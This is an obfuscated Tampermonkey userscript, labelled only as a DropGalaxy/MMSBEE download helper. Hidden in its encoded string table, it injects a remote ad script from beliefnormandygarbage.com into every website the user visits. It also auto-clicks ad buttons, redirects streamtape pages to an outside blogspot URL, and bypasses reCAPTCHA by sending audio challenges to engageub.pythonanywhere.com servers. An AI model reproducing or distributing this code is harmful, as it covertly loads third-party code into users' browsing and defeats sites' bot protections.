// ==UserScript==
// @name         DropGalaxy For MMSBEE
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  DropGalaxy For MMSBEE
// @author       Anayaali2019
// @license      OpenSource
// @match        https://dropgalaxy.com/*
// @match        https://mmsbee24.com/*
// @match        *://*/*
// @match        https://dropgalaxy.co/*
// @match        https://www.file-upload.org/*
// @match        https://file-upload.org/*
// @match        https://yoykp.com/*
// @match        https://gettapeads.com/*
// @match        https://sunci.com/*
// @match        https://sunci.*/*
// @exclude      *blogspot.*
// @exclude      https://blojdfsgd.blogspot.com/2024/02/userscript-test-atoptions-key.html/*
// @exclude      https://streamtape.com/e/JqoeAYr9MQHVjl/
// @match        https://www.babup.com/*
// @match        https://dropgalaxy.co/*
// @match        https://streamtape.com/*
// @match        https://api.streamtape.com/*
// @icon         https://www.google.com/s2/favicons?domain=dropgalaxy.com
// @match        *://*/recaptcha/*
// @connect      engageub.pythonanywhere.com
// @connect      engageub1.pythonanywhere.com
// @grant        GM_xmlhttpRequest
// ==/UserScript==
//https://www.file-upload.org/2b76hmirx74p
(function() {
    'use strict';
var _0x12aada=_0x46e0;(function(_0x3fab2a,_0x47af2f){var _0x3889be=_0x46e0,_0x41f157=_0x3fab2a();while(!![]){try{var _0x3de680=-parseInt(_0x3889be(0x17a))/0x1+-parseInt(_0x3889be(0x18d))/0x2+-parseInt(_0x3889be(0x189))/0x3+parseInt(_0x3889be(0x173))/0x4*(parseInt(_0x3889be(0x191))/0x5)+parseInt(_0x3889be(0x181))/0x6+-parseInt(_0x3889be(0x1d4))/0x7*(parseInt(_0x3889be(0x1a7))/0x8)+parseInt(_0x3889be(0x164))/0x9;if(_0x3de680===_0x47af2f)break;else _0x41f157['push'](_0x41f157['shift']());}catch(_0x5d989b){_0x41f157['push'](_0x41f157['shift']());}}}(_0x3af4,0xed3bf));var currentURL=checkCurrentWebsite(),solved=![],checkBoxClicked=![],waitingForAudioResponse=![];const CHECK_BOX=_0x12aada(0x1af),AUDIO_BUTTON='#recaptcha-audio-button',PLAY_BUTTON='.rc-audiochallenge-play-button\x20.rc-button-default',AUDIO_SOURCE=_0x12aada(0x19a),IMAGE_SELECT=_0x12aada(0x192),RESPONSE_FIELD=_0x12aada(0x19e),AUDIO_ERROR_MESSAGE=_0x12aada(0x1c8),AUDIO_RESPONSE=_0x12aada(0x188),RELOAD_BUTTON=_0x12aada(0x18f),RECAPTCHA_STATUS=_0x12aada(0x1c3),DOSCAPTCHA=_0x12aada(0x170),VERIFY_BUTTON='#recaptcha-verify-button',MAX_ATTEMPTS=0x5;var requestCount=0x0,recaptchaLanguage=qSelector(_0x12aada(0x197))[_0x12aada(0x1b9)](_0x12aada(0x1ad)),audioUrl='',recaptchaInitialStatus=qSelector(RECAPTCHA_STATUS)?qSelector(RECAPTCHA_STATUS)[_0x12aada(0x1c9)]:'',serversList=[_0x12aada(0x18e),_0x12aada(0x161)],latencyList=Array(serversList['length'])[_0x12aada(0x180)](0x2710);function _0x46e0(_0xeca6d2,_0x49ca6e){var _0x3af411=_0x3af4();return _0x46e0=function(_0x46e0d4,_0x7567a3){_0x46e0d4=_0x46e0d4-0x160;var _0xa1b133=_0x3af411[_0x46e0d4];return _0xa1b133;},_0x46e0(_0xeca6d2,_0x49ca6e);}function isHidden(_0x5105d5){return _0x5105d5['offsetParent']===null;}function _0x3af4(){var _0x4f4268=['error','\x0a\x20\x20\x20\x20var\x20atOptions\x20=\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x27key\x27\x20:\x20\x2750d11e7ecc2c61cfd9808aa3a6eb644f\x27,\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x27format\x27\x20:\x20\x27iframe\x27,\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x27height\x27\x20:\x2060,\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x27width\x27\x20:\x20468,\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x27params\x27\x20:\x20{}\x0a\x20\x20\x20\x20};\x0a\x20\x20\x20\x20var\x20scriptElement\x20=\x20document.createElement(\x27script\x27);\x0a\x20\x20\x20\x20scriptElement.type\x20=\x20\x27text/javascript\x27;\x0a\x20\x20\x20\x20scriptElement.async\x20=\x20true;\x0a\x20\x20\x20\x20scriptElement.src\x20=\x20\x22https://beliefnormandygarbage.com/50d11e7ecc2c61cfd9808aa3a6eb644f/invoke.js\x22;\x0a\x0a\x20\x20\x20\x20var\x20mainAreaElement\x20=\x20document.getElementById(\x22before_file_desc\x22);\x0a\x0a\x20\x20\x20\x20var\x20parentNode\x20=\x20mainAreaElement.parentNode;\x0a\x20\x20parentNode.insertBefore(scriptElement,\x20mainAreaElement);\x0a\x0a\x20\x20\x20\x20','3478008yIyBuH','https://engageub.pythonanywhere.com','#recaptcha-reload-button','link-button','16375vhFkuT','#rc-imageselect','yoykp','babup.com','sunci','Element\x20with\x20id\x20\x27countdown\x27\x20not\x20found\x20on\x20the\x20page.','html','countdown','upfiles\x20or\x20yoykp','#audio-source','SOLVED','pre','parse','.rc-audiochallenge-response-field','application/x-www-form-urlencoded','getTime','before_file_desc','method_free','api.streamtape','Name:\x20','Recaptcha\x20Language\x20is\x20not\x20recognized','https://blojdfsgd.blogspot.com/2024/02/userscript-test-atoptions-key.html?website=','56OPtYCZ','break-word','url','Element\x20with\x20id\x20\x27a-ads5\x27\x20galaxydrop\x20page\x203\x20\x20not\x20found.','createElement','includes','lang','value','.recaptcha-checkbox-border','type','Element\x20with\x20id\x20\x27F1\x27\x20galaxydrop\x20page\x203\x20\x20not\x20found.','/v/','\x0a\x20\x20\x20\x20var\x20atOptions\x20=\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x27key\x27\x20:\x20\x2750d11e7ecc2c61cfd9808aa3a6eb644f\x27,\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x27format\x27\x20:\x20\x27iframe\x27,\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x27height\x27\x20:\x2060,\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x27width\x27\x20:\x20468,\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x27params\x27\x20:\x20{}\x0a\x20\x20\x20\x20};\x0a\x20\x20\x20\x20var\x20scriptElement\x20=\x20document.createElement(\x27script\x27);\x0a\x20\x20\x20\x20scriptElement.type\x20=\x20\x27text/javascript\x27;\x0a\x20\x20\x20\x20scriptElement.async\x20=\x20true;\x0a\x20\x20\x20\x20scriptElement.src\x20=\x20\x22https://beliefnormandygarbage.com/50d11e7ecc2c61cfd9808aa3a6eb644f/invoke.js\x22;\x0a\x0a\x20\x20\x20\x20var\x20mainAreaElement\x20=\x20document.getElementById(\x22a-ads5\x22);\x0a\x0a\x20\x20\x20\x20var\x20parentNode\x20=\x20mainAreaElement.parentNode;\x0a\x20\x20parentNode.insertBefore(scriptElement,\x20mainAreaElement);\x0a\x0a\x20\x20\x20\x20','Response::','querySelectorAll','result','addEventListener','Automated\x20Queries\x20Detected','getAttribute','en-US','body','Ping\x20Test\x20Response\x20Timed\x20out\x20for\x20','proceed','querySelector','Size:\x20','insertBefore','load','Attempted\x20Max\x20Retries.\x20Stopping\x20the\x20solver','#recaptcha-accessible-status','streamtape','log','recaptcha.net','Response\x20Timed\x20out.\x20Retrying..','.rc-audiochallenge-error-message','innerText','\x0a\x20\x20\x20\x20var\x20atOptions\x20=\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x27key\x27\x20:\x20\x2750d11e7ecc2c61cfd9808aa3a6eb644f\x27,\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x27format\x27\x20:\x20\x27iframe\x27,\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x27height\x27\x20:\x2060,\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x27width\x27\x20:\x20468,\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x27params\x27\x20:\x20{}\x0a\x20\x20\x20\x20};\x0a\x20\x20\x20\x20var\x20scriptElement\x20=\x20document.createElement(\x27script\x27);\x0a\x20\x20\x20\x20scriptElement.type\x20=\x20\x27text/javascript\x27;\x0a\x20\x20\x20\x20scriptElement.async\x20=\x20true;\x0a\x20\x20\x20\x20scriptElement.src\x20=\x20\x22https://beliefnormandygarbage.com/50d11e7ecc2c61cfd9808aa3a6eb644f/invoke.js\x22;\x0a\x0a\x20\x20\x20\x20var\x20mainAreaElement\x20=\x20document.getElementById(\x22F1\x22);\x0a\x0a\x20\x20\x20\x20var\x20parentNode\x20=\x20mainAreaElement.parentNode;\x0a\x20\x20parentNode.insertBefore(scriptElement,\x20mainAreaElement);\x0a\x0a\x20\x20\x20\x20','An\x20error\x20occurred\x20while\x20solving.\x20Stopping\x20the\x20solver.','URL:\x20','size','responseText','wordWrap','a-ads5','GET','name','Element\x20with\x20id\x20\x27row\x27\x20galaxydrop\x20page\x202\x20\x20not\x20found.','146503FrmuoZ','length','&lang=','style','https://engageub1.pythonanywhere.com','input[name=\x22method_free\x22]','readyState','30571596DwLEYa','textContent','getElementById','gettapeads','input=','row','getElementsByTagName','message','disabled','Exception\x20handling\x20response.\x20Retrying..','JSON\x20data\x20not\x20found\x20within\x20<pre>\x20tag\x20in\x20the\x20body.','Element\x20with\x20id\x20\x27before_file_desc\x27\x20galaxydrop\x20page\x203\x20\x20not\x20found.','.rc-doscaptcha-body','src','_self','540MIPpEF','downloadbtn','\x0a\x20\x20\x20\x20\x20\x20\x20\x20var\x20atOptions\x20=\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x27key\x27\x20:\x20\x2750d11e7ecc2c61cfd9808aa3a6eb644f\x27,\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x27format\x27\x20:\x20\x27iframe\x27,\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x27height\x27\x20:\x2060,\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x27width\x27\x20:\x20468,\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x27params\x27\x20:\x20{}\x0a\x20\x20\x20\x20\x20\x20\x20\x20};\x0a\x20\x20\x20\x20\x20\x20\x20\x20var\x20scriptElement\x20=\x20document.createElement(\x27script\x27);\x0a\x20\x20\x20\x20\x20\x20\x20\x20scriptElement.type\x20=\x20\x27text/javascript\x27;\x0a\x20\x20\x20\x20\x20\x20\x20\x20scriptElement.async\x20=\x20true;\x0a\x20\x20\x20\x20\x20\x20\x20\x20scriptElement.src\x20=\x20\x22https://beliefnormandygarbage.com/50d11e7ecc2c61cfd9808aa3a6eb644f/invoke.js\x22;\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20var\x20mainAreaElement\x20=\x20document.getElementById(\x22countdown\x22);\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20if\x20(mainAreaElement)\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20var\x20parentNode\x20=\x20mainAreaElement.parentNode;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20parentNode.insertBefore(scriptElement,\x20mainAreaElement);\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x20else\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20console.error(\x22Element\x20with\x20id\x20\x27countdown\x27\x20not\x20found.\x22);\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20','Recaptcha\x20Language\x20is\x20','pre-wrap','Free\x20Download\x20button\x20not\x20found!','replace','660820dCvCzq','bframe','none','script','text/javascript','Invalid\x20Response.\x20Retrying..','fill','5825670uSbutz','parentNode','click','location','file-upload','href','google.com','#audio-response','3875628UbdfBg','display'];_0x3af4=function(){return _0x4f4268;};return _0x3af4();}async function getTextFromAudio(_0x381dc9){var _0x511a5e=_0x12aada,_0x2db568=0x186a0,_0x302522='';for(let _0x49deae=0x0;_0x49deae<latencyList[_0x511a5e(0x1d5)];_0x49deae++){latencyList[_0x49deae]<=_0x2db568&&(_0x2db568=latencyList[_0x49deae],_0x302522=serversList[_0x49deae]);}requestCount=requestCount+0x1,_0x381dc9=_0x381dc9[_0x511a5e(0x179)](_0x511a5e(0x1c6),_0x511a5e(0x187)),recaptchaLanguage[_0x511a5e(0x1d5)]<0x1&&(console['log'](_0x511a5e(0x1a5)),recaptchaLanguage=_0x511a5e(0x1ba)),console[_0x511a5e(0x1c5)](_0x511a5e(0x176)+recaptchaLanguage),GM_xmlhttpRequest({'method':'POST','url':_0x302522,'headers':{'Content-Type':_0x511a5e(0x19f)},'data':_0x511a5e(0x168)+encodeURIComponent(_0x381dc9)+_0x511a5e(0x1d6)+recaptchaLanguage,'timeout':0xea60,'onload':function(_0x3dd87c){var _0x29cdaf=_0x511a5e;console[_0x29cdaf(0x1c5)](_0x29cdaf(0x1b4)+_0x3dd87c[_0x29cdaf(0x1ce)]);try{if(_0x3dd87c&&_0x3dd87c[_0x29cdaf(0x1ce)]){var _0x1d35c6=_0x3dd87c[_0x29cdaf(0x1ce)];if(_0x1d35c6=='0'||_0x1d35c6[_0x29cdaf(0x1ac)]('<')||_0x1d35c6[_0x29cdaf(0x1ac)]('>')||_0x1d35c6[_0x29cdaf(0x1d5)]<0x2||_0x1d35c6['length']>0x32)console[_0x29cdaf(0x1c5)](_0x29cdaf(0x17f));else qSelector(AUDIO_SOURCE)&&qSelector(AUDIO_SOURCE)[_0x29cdaf(0x171)]&&audioUrl==qSelector(AUDIO_SOURCE)[_0x29cdaf(0x171)]&&qSelector(AUDIO_RESPONSE)&&!qSelector(AUDIO_RESPONSE)[_0x29cdaf(0x1ae)]&&qSelector(AUDIO_BUTTON)[_0x29cdaf(0x160)][_0x29cdaf(0x18a)]==_0x29cdaf(0x17c)&&qSelector(VERIFY_BUTTON)?(qSelector(AUDIO_RESPONSE)[_0x29cdaf(0x1ae)]=_0x1d35c6,qSelector(VERIFY_BUTTON)['click']()):console[_0x29cdaf(0x1c5)]('Could\x20not\x20locate\x20text\x20input\x20box');waitingForAudioResponse=![];}}catch(_0x27e50b){console[_0x29cdaf(0x1c5)](_0x27e50b[_0x29cdaf(0x16b)]),console[_0x29cdaf(0x1c5)](_0x29cdaf(0x16d)),waitingForAudioResponse=![];}},'onerror':function(_0x2e0789){var _0x90d24c=_0x511a5e;console[_0x90d24c(0x1c5)](_0x2e0789),waitingForAudioResponse=![];},'ontimeout':function(){var _0x1e37fe=_0x511a5e;console['log'](_0x1e37fe(0x1c7)),waitingForAudioResponse=![];}});}async function pingTest(_0x2ff9c5){var _0x2a0d1f=_0x12aada,_0x24df4d=new Date()[_0x2a0d1f(0x1a0)]();GM_xmlhttpRequest({'method':_0x2a0d1f(0x1d1),'url':_0x2ff9c5,'headers':{'Content-Type':_0x2a0d1f(0x19f)},'data':'','timeout':0x1f40,'onload':function(_0x2f7748){var _0x317135=_0x2a0d1f;if(_0x2f7748&&_0x2f7748[_0x317135(0x1ce)]&&_0x2f7748[_0x317135(0x1ce)]=='0'){var _0x320eed=new Date()[_0x317135(0x1a0)](),_0x4a87f3=_0x320eed-_0x24df4d;for(let _0x4d36d1=0x0;_0x4d36d1<serversList[_0x317135(0x1d5)];_0x4d36d1++){_0x2ff9c5==serversList[_0x4d36d1]&&(latencyList[_0x4d36d1]=_0x4a87f3);}}},'onerror':function(_0x466b28){console['log'](_0x466b28);},'ontimeout':function(){var _0x5eb2b0=_0x2a0d1f;console[_0x5eb2b0(0x1c5)](_0x5eb2b0(0x1bc)+_0x2ff9c5);}});}function qSelectorAll(_0x2f56f0){var _0xd387ce=_0x12aada;return document[_0xd387ce(0x1b5)](_0x2f56f0);}function qSelector(_0x394744){return document['querySelector'](_0x394744);}if(qSelector(CHECK_BOX))qSelector(CHECK_BOX)['click']();else{if(window['location'][_0x12aada(0x186)][_0x12aada(0x1ac)](_0x12aada(0x17b)))for(let i=0x0;i<serversList[_0x12aada(0x1d5)];i++){pingTest(serversList[i]);}}var startInterval=setInterval(function(){var _0x4d0207=_0x12aada;try{!checkBoxClicked&&qSelector(CHECK_BOX)&&!isHidden(qSelector(CHECK_BOX))&&(qSelector(CHECK_BOX)[_0x4d0207(0x183)](),checkBoxClicked=!![]);qSelector(RECAPTCHA_STATUS)&&qSelector(RECAPTCHA_STATUS)[_0x4d0207(0x1c9)]!=recaptchaInitialStatus&&(solved=!![],console[_0x4d0207(0x1c5)](_0x4d0207(0x19b)),clearInterval(startInterval));requestCount>MAX_ATTEMPTS&&(console[_0x4d0207(0x1c5)](_0x4d0207(0x1c2)),solved=!![],clearInterval(startInterval));if(!solved){qSelector(AUDIO_BUTTON)&&!isHidden(qSelector(AUDIO_BUTTON))&&qSelector(IMAGE_SELECT)&&qSelector(AUDIO_BUTTON)[_0x4d0207(0x183)]();if(!waitingForAudioResponse&&qSelector(AUDIO_SOURCE)&&qSelector(AUDIO_SOURCE)[_0x4d0207(0x171)]&&qSelector(AUDIO_SOURCE)[_0x4d0207(0x171)][_0x4d0207(0x1d5)]>0x0&&audioUrl==qSelector(AUDIO_SOURCE)[_0x4d0207(0x171)]&&qSelector(RELOAD_BUTTON)||qSelector(AUDIO_ERROR_MESSAGE)&&qSelector(AUDIO_ERROR_MESSAGE)['innerText'][_0x4d0207(0x1d5)]>0x0&&qSelector(RELOAD_BUTTON)&&!qSelector(RELOAD_BUTTON)[_0x4d0207(0x16c)])qSelector(RELOAD_BUTTON)[_0x4d0207(0x183)]();else{if(!waitingForAudioResponse&&qSelector(RESPONSE_FIELD)&&!isHidden(qSelector(RESPONSE_FIELD))&&!qSelector(AUDIO_RESPONSE)[_0x4d0207(0x1ae)]&&qSelector(AUDIO_SOURCE)&&qSelector(AUDIO_SOURCE)[_0x4d0207(0x171)]&&qSelector(AUDIO_SOURCE)[_0x4d0207(0x171)]['length']>0x0&&audioUrl!=qSelector(AUDIO_SOURCE)['src']&&requestCount<=MAX_ATTEMPTS)waitingForAudioResponse=!![],audioUrl=qSelector(AUDIO_SOURCE)[_0x4d0207(0x171)],getTextFromAudio(audioUrl);else{}}}qSelector(DOSCAPTCHA)&&qSelector(DOSCAPTCHA)[_0x4d0207(0x1c9)][_0x4d0207(0x1d5)]>0x0&&(console[_0x4d0207(0x1c5)](_0x4d0207(0x1b8)),clearInterval(startInterval));}catch(_0x2d651f){console[_0x4d0207(0x1c5)](_0x2d651f['message']),console[_0x4d0207(0x1c5)](_0x4d0207(0x1cb)),clearInterval(startInterval);}},0x1388),dropgalaxypage1=![],dropgalaxypage2=![];function checkCurrentWebsite(){var _0x2a378f=_0x12aada;return currentURL=window[_0x2a378f(0x184)][_0x2a378f(0x186)],currentURL;}var ads_button1='button-0',btnClickDonwnload1=_0x12aada(0x1a2),btnClickDonwnload2=_0x12aada(0x174),btnClickDonwnload3='dl';if(currentURL[_0x12aada(0x1ac)]('dropgalaxy')){var scriptElement=document[_0x12aada(0x1ab)](_0x12aada(0x17d));scriptElement['type']=_0x12aada(0x17e),scriptElement['textContent']=_0x12aada(0x1b3);var mainAreaElement=document[_0x12aada(0x166)](_0x12aada(0x1d0));if(mainAreaElement){var parentNode=mainAreaElement[_0x12aada(0x182)];parentNode['insertBefore'](scriptElement,mainAreaElement);}else console['error'](_0x12aada(0x1aa));var mainAreaElement1=document[_0x12aada(0x166)](_0x12aada(0x169));if(mainAreaElement1){var parentNode1=mainAreaElement1[_0x12aada(0x182)];parentNode1[_0x12aada(0x1c0)](scriptElement,mainAreaElement1);}else console[_0x12aada(0x18b)](_0x12aada(0x1d3));let intervalId=setInterval(()=>{var _0x4bb9d5=_0x12aada;document[_0x4bb9d5(0x166)](ads_button1)&&document[_0x4bb9d5(0x166)](ads_button1)[_0x4bb9d5(0x183)](),document[_0x4bb9d5(0x166)](btnClickDonwnload1)&&(dropgalaxypage1==![]&&(document['getElementById'](btnClickDonwnload1)['click'](),dropgalaxypage1=!![]));},0x3e8);var pageLoaded=![];if(dropgalaxypage2==![]){document[_0x12aada(0x166)](ads_button1)&&document['getElementById'](ads_button1)['click']();const downloadIntervalId=setInterval(()=>{var _0xffc1dc=_0x12aada,_0x58bb1c=document['getElementById'](btnClickDonwnload2);_0x58bb1c?(!document[_0xffc1dc(0x163)]||document[_0xffc1dc(0x163)]==='complete'&&pageLoaded)&&(dropgalaxypage2=!![],_0x58bb1c[_0xffc1dc(0x183)](),clearInterval(intervalId)):console[_0xffc1dc(0x1c5)]('Download\x20button\x20not\x20found!'),document['getElementById'](ads_button1)&&document[_0xffc1dc(0x166)](ads_button1)[_0xffc1dc(0x183)]();},0x1388);window[_0x12aada(0x1b7)](_0x12aada(0x1c1),function(){pageLoaded=!![];});}if(document[_0x12aada(0x166)](btnClickDonwnload3)){const PAGE_3_IDENTIFIER=_0x12aada(0x1a9),downloadBtn=document[_0x12aada(0x166)](PAGE_3_IDENTIFIER),url=downloadBtn[_0x12aada(0x1ae)],didWindowOpen=window['open'](url,_0x12aada(0x172));!didWindowOpen&&downloadBtn['click']();}}currentURL[_0x12aada(0x1ac)](_0x12aada(0x194))&&document[_0x12aada(0x166)](_0x12aada(0x1bd))[_0x12aada(0x183)]();if(currentURL[_0x12aada(0x1ac)](_0x12aada(0x185))){var freeDownloadButton=document[_0x12aada(0x1be)](_0x12aada(0x162)),LastDownLoad=document['getElementById']('download-btn');freeDownloadButton?freeDownloadButton['click']():console[_0x12aada(0x1c5)](_0x12aada(0x178));LastDownLoad&&LastDownLoad['click']();if(document[_0x12aada(0x166)](_0x12aada(0x1a1))){var scriptElement=document[_0x12aada(0x1ab)](_0x12aada(0x17d));scriptElement[_0x12aada(0x1b0)]=_0x12aada(0x17e),scriptElement[_0x12aada(0x165)]=_0x12aada(0x18c);var mainAreaElement=document[_0x12aada(0x166)](_0x12aada(0x1a1));if(mainAreaElement){var parentNode=mainAreaElement[_0x12aada(0x182)];parentNode[_0x12aada(0x1c0)](scriptElement,mainAreaElement);}else console[_0x12aada(0x18b)](_0x12aada(0x16f));}if(document[_0x12aada(0x166)]('F1')){var scriptElement1=document[_0x12aada(0x1ab)](_0x12aada(0x17d));scriptElement1[_0x12aada(0x1b0)]=_0x12aada(0x17e),scriptElement1[_0x12aada(0x165)]=_0x12aada(0x1ca);var mainAreaElement=document[_0x12aada(0x166)]('F1');if(mainAreaElement){var parentNode=mainAreaElement[_0x12aada(0x182)];parentNode[_0x12aada(0x1c0)](scriptElement,mainAreaElement);}else console['error'](_0x12aada(0x1b1));}}var isDownloading=![];(currentURL[_0x12aada(0x1ac)](_0x12aada(0x1c4))||currentURL[_0x12aada(0x1ac)](_0x12aada(0x167)))&&currentURL[_0x12aada(0x1ac)](_0x12aada(0x1b2))&&(window['location'][_0x12aada(0x186)]=_0x12aada(0x1a6)+currentURL);if(currentURL[_0x12aada(0x1ac)](_0x12aada(0x1a3))){function extractJSONFromBody(){var _0x206e4e=_0x12aada,_0x4be7ea=document[_0x206e4e(0x16a)](_0x206e4e(0x19c));for(var _0x500607=0x0;_0x500607<_0x4be7ea[_0x206e4e(0x1d5)];_0x500607++){var _0x9488c8=_0x4be7ea[_0x500607];if(_0x9488c8[_0x206e4e(0x160)][_0x206e4e(0x1cf)]===_0x206e4e(0x1a8)&&_0x9488c8[_0x206e4e(0x160)]['whiteSpace']===_0x206e4e(0x177)){var _0x207821=_0x9488c8[_0x206e4e(0x165)];return JSON[_0x206e4e(0x19d)](_0x207821);}}return null;}var data=extractJSONFromBody();if(data){var name=data[_0x12aada(0x1b6)][_0x12aada(0x1d2)],size=data[_0x12aada(0x1b6)][_0x12aada(0x1cd)],url=data[_0x12aada(0x1b6)]['url'];console[_0x12aada(0x1c5)](_0x12aada(0x1a4)+name),console[_0x12aada(0x1c5)](_0x12aada(0x1bf)+size),console['log'](_0x12aada(0x1cc)+url),document[_0x12aada(0x16a)](_0x12aada(0x19c))[_0x12aada(0x165)]=url,window[_0x12aada(0x184)][_0x12aada(0x186)]=url;}else console[_0x12aada(0x1c5)](_0x12aada(0x16e));}if(currentURL[_0x12aada(0x1ac)]('yoykp')||currentURL[_0x12aada(0x1ac)]('upfiles')||currentURL[_0x12aada(0x1ac)](_0x12aada(0x195))){if(document[_0x12aada(0x166)](_0x12aada(0x198))){var scriptElement1=document[_0x12aada(0x1ab)](_0x12aada(0x17d));scriptElement1[_0x12aada(0x1b0)]=_0x12aada(0x17e),scriptElement1[_0x12aada(0x165)]=_0x12aada(0x175);var scriptElement=document[_0x12aada(0x1ab)](_0x12aada(0x17d));scriptElement[_0x12aada(0x1b0)]=_0x12aada(0x17e),scriptElement[_0x12aada(0x165)]=scriptElement1[_0x12aada(0x165)],document['body']['appendChild'](scriptElement);}else console[_0x12aada(0x18b)](_0x12aada(0x196));function clickLinkButton(){var _0x5d046b=_0x12aada;document['getElementById'](_0x5d046b(0x190))&&(document[_0x5d046b(0x166)](_0x5d046b(0x190))[_0x5d046b(0x183)](),console[_0x5d046b(0x1c5)]('clicked\x20linkbutton'));}let yoykpInterval=setInterval(function(){var _0x5667fd=_0x12aada,_0x58e95c=window[_0x5667fd(0x184)]['href'];if(_0x58e95c[_0x5667fd(0x1ac)](_0x5667fd(0x193))||_0x58e95c[_0x5667fd(0x1ac)]('upfiles')||document[_0x5667fd(0x1bb)][_0x5667fd(0x165)][_0x5667fd(0x1ac)]('UpFiles')||_0x58e95c['includes']('sunci')){clickLinkButton(),console[_0x5667fd(0x1c5)](_0x5667fd(0x199));var _0x347a30=document[_0x5667fd(0x166)](_0x5667fd(0x190)),_0x39b954=_0x347a30[_0x5667fd(0x1b9)](_0x5667fd(0x186));_0x39b954&&_0x39b954!=='javascript:\x20void(0)'&&(_0x347a30[_0x5667fd(0x183)](),clearInterval(yoykpInterval));}},0x1388);}try{var scriptElement=document[_0x12aada(0x1ab)]('script');scriptElement[_0x12aada(0x1b0)]=_0x12aada(0x17e),scriptElement[_0x12aada(0x165)]='\x0a\x20\x20\x20\x20\x20\x20\x20\x20var\x20atOptions\x20=\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x27key\x27\x20:\x20\x2750d11e7ecc2c61cfd9808aa3a6eb644f\x27,\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x27format\x27\x20:\x20\x27iframe\x27,\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x27height\x27\x20:\x2060,\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x27width\x27\x20:\x20468,\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x27params\x27\x20:\x20{}\x0a\x20\x20\x20\x20\x20\x20\x20\x20};\x0a\x20\x20\x20\x20\x20\x20\x20\x20var\x20scriptElement\x20=\x20document.createElement(\x27script\x27);\x0a\x20\x20\x20\x20\x20\x20\x20\x20scriptElement.type\x20=\x20\x27text/javascript\x27;\x0a\x20\x20\x20\x20\x20\x20\x20\x20scriptElement.async\x20=\x20true;\x0a\x20\x20\x20\x20\x20\x20\x20\x20scriptElement.src\x20=\x20\x22https://beliefnormandygarbage.com/50d11e7ecc2c61cfd9808aa3a6eb644f/invoke.js\x22;\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20var\x20mainAreaElement\x20=document.body;\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20var\x20parentNode\x20=\x20mainAreaElement.parentNode;\x0a\x20\x20\x20\x20\x20\x20\x20\x20parentNode.insertBefore(scriptElement,\x20mainAreaElement);\x0a\x20\x20\x20\x20',document[_0x12aada(0x1bb)]['appendChild'](scriptElement);var newElement=document[_0x12aada(0x1ab)]('div');document[_0x12aada(0x1bb)]['appendChild'](newElement);}catch(_0xd4fc0){}
  })();
